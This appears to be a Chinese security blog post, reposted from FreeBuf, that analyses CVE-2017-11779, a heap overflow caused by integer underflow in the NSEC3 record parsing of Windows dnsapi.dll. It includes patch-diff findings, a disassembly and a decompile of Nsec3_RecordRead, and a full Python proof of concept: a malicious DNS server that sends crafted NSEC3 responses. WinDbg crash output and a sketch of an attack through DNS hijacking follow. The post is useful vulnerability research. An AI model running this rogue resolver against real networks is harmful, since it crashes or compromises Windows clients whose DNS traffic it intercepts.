---
layout: post
title: Windows DNS API RCE漏洞分析及PoC构造
subtitle: 2017/11/09
date: 2017-11-09
author: FR
header-img: img/depot/post-butiao.jpg
catalog: true
tags:
    - windows
    - dns
    - 漏洞
    - RCE漏洞
    - PoC
---

- **来自FreeBuf [【FreeBuf链接】](http://www.freebuf.com/vuls/151050.html)**  

根据 Microsoft 2017年10月安全通告，多个版本 Windows 中的 dnsapi.dll 在处理 DNS response 时可导致 SYSTEM 权限 RCE 。

需要注意的是，不是 Windows 系统中所有 DNS 解析都有问题，比如 nslookup 并不解析 DNSSEC，所以没有问题，同时，也不是所有能触发漏洞的地方都能在 SYSTEM 权限下执行代码，只有像 Windows Update 这样的 SYSTEM 权限进程才能成为 SYSTEM 权限 RCE 的攻击入口。

以 DNS Client API DLL 10.0.15063.0 与 10.0.15063.674 为例，补丁对比，

![img/2017-11-09/15084703471529.png](http://image.3001.net/images/20171020/15084703471529.png)

可知漏洞存在于 dnsapi.dll 中的 Nsec3_RecordRead 函数，那么可以确定问题就是出在解析 DNS response 的 NSEC3 Resource record，为了构造 PoC，先得了解这个 “NSEC3″ 的背景。首先，DNS 协议数据结构如下图所示，

![img/2017-11-09/15084703547099.png](http://image.3001.net/images/20171020/15084703547099.png)

例如，当访问[http://justanotherbuganalysis.github.io/](http://justanotherbuganalysis.github.io/) 时， DNS query 如下，

```
9d 4b 01 00 00 01 00 00 00 00 00 00 16 6a 75 73  .K...........jus  
74 61 6e 6f 74 68 65 72 62 75 67 61 6e 61 6c 79  tanotherbuganaly  
73 69 73 06 67 69 74 68 75 62 02 69 6f 00 00 01  sis.github.io...  
00 01                                            ..
```

DNS response 如下，

```
9d 4b 81 80 00 01 00 02 00 00 00 00 16 6a 75 73  .K...........jus
74 61 6e 6f 74 68 65 72 62 75 67 61 6e 61 6c 79  tanotherbuganaly
73 69 73 06 67 69 74 68 75 62 02 69 6f 00 00 01  sis.github.io...
00 01 c0 0c 00 05 00 01 00 00 0e 10 00 1b 03 73  ...............s
6e 69 06 67 69 74 68 75 62 03 6d 61 70 06 66 61  ni.github.map.fa
73 74 6c 79 03 6e 65 74 00 c0 3e 00 01 00 01 00  stly.net..>.....
00 07 08 00 04 97 65 4d 93                       ......eM.
```

可见该 DNS response 中的 Answer RRs 包含了 CNAME(0×0005) 与 A(0×0001) 两个 Resource record(RR)，由于该域名所在的 Domain Zone 并未配置 DNSSEC，所以在 response 中并没有 Authority RRs 与 Additional RRs。后面为了把程序执行流引到 Nsec3_RecordRead 函数，触发漏洞，在 Authority RRs 中加入特定 NSEC3(0×0032) 记录即可。

再来看漏洞，

```
.text:0000000180066693                 movzx   ecx, ax
.text:0000000180066696                 xor     edx, edx
.text:0000000180066698                 call    Dns_AllocateRecordEx
.text:000000018006669D                 mov     r13, rax
.text:00000001800666A0                 test    rax, rax
.text:00000001800666A3                 jz      short loc_18006668C
.text:00000001800666A5                 mov     al, [r14]
.text:00000001800666A8                 mov     [r13+20h], al
.text:00000001800666AC                 mov     al, [r14+1]
.text:00000001800666B0                 mov     [r13+21h], al
.text:00000001800666B4                 movzx   ecx, word ptr [r14+2] ; netshort
.text:00000001800666B9                 call    cs:__imp_ntohs
.text:00000001800666BF                 mov     [r13+22h], ax
.text:00000001800666C4                 lea     rcx, [r13+28h]  ; Dst
.text:00000001800666C8                 movzx   esi, byte ptr [r14+4]
.text:00000001800666CD                 add     r14, 5
.text:00000001800666D1                 mov     rdx, r14        ; Src --> NSEC3 RR Salt value
.text:00000001800666D4                 mov     [r13+24h], sil
.text:00000001800666D8                 mov     r8d, esi        ; Size --> Salt length
.text:00000001800666DB                 call    memcpy_0        ; Overflow
.text:00000001800666E0                 add     r14, rsi
.text:00000001800666E3                 lea     rcx, [rsi+28h]
.text:00000001800666E7                 add     rcx, r13        ; Dst
.text:00000001800666EA                 movzx   ebx, byte ptr [r14]
.text:00000001800666EE                 inc     r14
.text:00000001800666F1                 mov     rdx, r14        ; Src --> Data in NSEC3 RR
.text:00000001800666F4                 mov     [r13+25h], bl
.text:00000001800666F8                 mov     r8d, ebx        ; Size --> Hash length
.text:00000001800666FB                 call    memcpy_0        ; Overlow
.text:0000000180066700                 sub     r15w, bx
.text:0000000180066704                 lea     rcx, [rsi+28h]
.text:0000000180066708                 sub     r15w, si
.text:000000018006670C                 lea     rdx, [rbx+r14]  ; Src
.text:0000000180066710                 add     rcx, rbx
.text:0000000180066713                 movzx   r8d, r15w       ; Size
.text:0000000180066717                 add     rcx, r13        ; Dst
.text:000000018006671A                 mov     [r13+26h], r8w
.text:000000018006671F                 call    memcpy_0        ; Heap Overflow caused by Integer Overflow
.text:0000000180066724                 mov     rax, r13
```


```
_WORD *__fastcall Nsec3_RecordRead(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int16 v5; // ax
  __int64 v6; // r14
  DWORD v7; // ecx
  __int16 v9; // r15
  _WORD *v10; // rax
  _WORD *v11; // r13
  __int64 v12; // rsi
  char *v13; // r14
  char *v14; // r14
  __int64 v15; // rbx
  unsigned __int16 v16; // r15
​
  v5 = a4 + 6;
  v6 = a4;
  if ( a4 + 6 >= a5 )
  {
    if ( byte_180091A45 & 4 )
      WPP_SF_(46i64, &WPP_3905b13578e93036ce8b15be772e1375_Traceguids);
    v7 = 13;
    goto LABEL_5;
  }
  v9 = a5 - v5;
  if ( (unsigned int)(unsigned __int16)(a5 - v5) + 8 > 0xFFFF
    || (v10 = Dns_AllocateRecordEx((unsigned __int16)(v9 + 8), 0), (v11 = v10) == 0i64) )
  {
    v7 = 14;
LABEL_5:
    SetLastError(v7);
    return 0i64;
  }
  *((_BYTE *)v10 + 32) = *(_BYTE *)v6;
  *((_BYTE *)v10 + 33) = *(_BYTE *)(v6 + 1);
  v10[17] = ntohs(*(_WORD *)(v6 + 2));
  v12 = *(unsigned __int8 *)(v6 + 4);
  v13 = (char *)(v6 + 5);
  *((_BYTE *)v11 + 36) = v12;
  memcpy_0(v11 + 20, v13, (unsigned int)v12);
  v14 = &v13[v12];
  v15 = (unsigned __int8)*v14++;
  *((_BYTE *)v11 + 37) = v15;
  memcpy_0((char *)v11 + v12 + 40, v14, (unsigned int)v15);
  v16 = v9 - v15 - v12;                  //Integer Overflow
  v11[19] = v16;
  memcpy_0((char *)v11 + v15 + v12 + 40, &v14[v15], v16);
  return v11;
}
```

对于第一个 memcpy，通过调用 Dns_AllocateRecordEx 函数分配了 Dst 缓冲区，其大小取决于 NSEC3 RR 的 Data length 字段，Src 指向 NSEC3 RR 的 Salt value 字段，而 Size 则来自 Salt length 字段，都完全可控。

对于第二个 memcpy，同样的问题，只不过 Size 来自 Hash length 字段。

第三个 memcpy 操作之前，由于 v15, v12 皆可控，故可导致 unsigned __int16 v16 = v9 – v15 – v12 发生 Integer Underflow，进一步导致 memcpy 越界读写。

PoC 如下，

```
import SocketServer
import sys
​
class Handler(SocketServer.BaseRequestHandler):
  def handle(self):
    socket = self.request[1]
    data = self.request[0].strip()
    response = data[:2]
    response += "81a30001000000060001".decode("hex")
    response += self.get_question(data)
    response += "20564c513234375149385031545433413843474d4437474c464e44544947534455c01100320001000000b3".decode("hex")
    response += "0033".decode("hex")  # Data length
    response += "01000014".decode("hex")
    response += "ff".decode("hex")    # Salt length
    response += "80637d8af055b5eeca2a621edaaa3c5e".decode("hex")
    response += "14".decode("hex")    # Hash length
    response += "3d8a3eb61a9dfa951a42d7779c1f150685a01947000762018008000290c186002e0001000000b3011d00320a03000000b459fd6ea859d5d398794f057373686670036e6574000601e89304161294b0a21f3828a4c137c675cabaddeff8837fad9c553895b7bf9e2b21fc789786d1f3fb734e519a4662d453ea41fbcca87f9657608017a602639cc636a249d94f529bcc504e1823d0d59e446ed67b1e7a93ebd5f07db21e4f8e29150ff2454b34f5716be5b712640500e672b0eb81c5f03d6c4ea42effd282e842df4321b45a4c9f678c7996cd033b29ce1a13943856010eed3a6bd41880713be77e5459ded91199ec4b2b70543c6f00e20dd2cb1642424fb7be33731b1a2707ac8494d38638cbc1862bacad4824d8644aee4c835178ba4339524edf8e32cf9e63da0d6309c6a8187e6c7c181a99445a4cb799cab602359c22456a7db3d61809".decode("hex")
    response += "0000290200000080000000".decode("hex")
    print(response.encode("hex"))
    socket.sendto(response, self.client_address)
​
  def get_question(self, data):
    start_idx = 12
    end_idx = start_idx
    num_questions = (ord(data[4]) << 8) | ord(data[5])
    while num_questions > 0:
      while data[end_idx] != "\0":
        end_idx += ord(data[end_idx]) + 1
      end_idx += 5
      num_questions -= 1
    return data[start_idx:end_idx]
​
if __name__ == "__main__":
  server = SocketServer.ThreadingUDPServer(("0.0.0.0", 53), Handler)
  print("CVE-2017-11779 PoC Started.")
  try:
    server.serve_forever()
  except KeyboardInterrupt:
    server.shutdown()
    sys.exit(0)
```

例如，触发第一个 memcpy 堆溢出，令 NSEC3 RR 的 Salt length = 255，

![img/2017-11-09/15084703643487.png](http://image.3001.net/images/20171020/15084703643487.png)

```
0:006> r
rax=0000000000000014 rbx=0000000000000001 rcx=0000027fd88f41f8
rdx=0000027fd888e7c8 rsi=00000000000000ff rdi=0000000000000001
rip=00007ffe5fd266db rsp=000000ddf9ffee30 rbp=000000ddf9ffef70
 r8=00000000000000ff  r9=0000000000000000 r10=0000000000000000
r11=00007ffe6425bf17 r12=0000027fd88f4850 r13=0000027fd88f41d0
r14=0000027fd888e7c8 r15=0000027fd888002d
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
DNSAPI!Nsec3_RecordRead+0xbb:
00007ffe`5fd266db e896d8fbff      call    DNSAPI!memcpy (00007ffe`5fce3f76)
0:006> db rdx
0000027f`d888e7c8  80 63 7d 8a f0 55 b5 ee-ca 2a 62 1e da aa 3c 5e  .c}..U...*b...<^
0000027f`d888e7d8  14 3d 8a 3e b6 1a 9d fa-95 1a 42 d7 77 9c 1f 15  .=.>......B.w...
0000027f`d888e7e8  06 85 a0 19 47 00 07 62-01 80 08 00 02 90 c1 86  ....G..b........
0000027f`d888e7f8  00 2e 00 01 00 00 00 b3-01 1d 00 32 0a 03 00 00  ...........2....
0000027f`d888e808  00 b4 59 fd 6e a8 59 d5-d3 98 79 4f 05 73 73 68  ..Y.n.Y...yO.ssh
0000027f`d888e818  66 70 03 6e 65 74 00 06-01 e8 93 04 16 12 94 b0  fp.net..........
0000027f`d888e828  a2 1f 38 28 a4 c1 37 c6-75 ca ba dd ef f8 83 7f  ..8(..7.u.......
0000027f`d888e838  ad 9c 55 38 95 b7 bf 9e-2b 21 fc 78 97 86 d1 f3  ..U8....+!.x....
```

最终，

```0:006> g
(580.5e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ntdll!memcpy+0x220:
00007ffe`6425bd20 f30f7f40f0      movdqu  xmmword ptr [rax-10h],xmm0 ds:0000027f`d8904215=????????????????????????????????
0:006> k
 # Child-SP          RetAddr           Call Site
00 000000dd`f9ffee28 00007ffe`5fd26724 ntdll!memcpy+0x220
01 000000dd`f9ffee30 00007ffe`5fcef5e6 DNSAPI!Nsec3_RecordRead+0x104
02 000000dd`f9ffee70 00007ffe`5fcd6d3f DNSAPI!Dns_ParseMessage+0x20496
03 000000dd`f9fff360 00007ffe`5fcd6b33 DNSAPI!Send_AndRecvComplete+0x17f
04 000000dd`f9fff4e0 00007ffe`5fcd1fc1 DNSAPI!Send_AndRecvUdpComplete+0x333
05 000000dd`f9fff550 00007ffe`611a0320 DNSAPI!Recv_IoCompletionCallback+0x1f1
06 000000dd`f9fff5d0 00007ffe`641f3287 KERNELBASE!BasepTpIoCallback+0x50
07 000000dd`f9fff620 00007ffe`641f16e1 ntdll!TppIopExecuteCallback+0x127
08 000000dd`f9fff6a0 00007ffe`61722774 ntdll!TppWorkerThread+0x411
09 000000dd`f9fff9b0 00007ffe`64220d61 KERNEL32!BaseThreadInitThunk+0x14
0a 000000dd`f9fff9e0 00000000`00000000 ntdll!RtlUserThreadStart+0x21
```

综上所述，攻击者通过 MITM 或修改路由器 DNS 地址等方式劫持 DNS 流量后，当用户浏览网页或 Windows 自动同步时间时，即可通过 Dnscache(DNS Client) 服务解析恶意 DNS response，触发漏洞，攻击者在绕过 ASLR、DEP 等缓解措施后即可实现近似无交互远程 RCE。
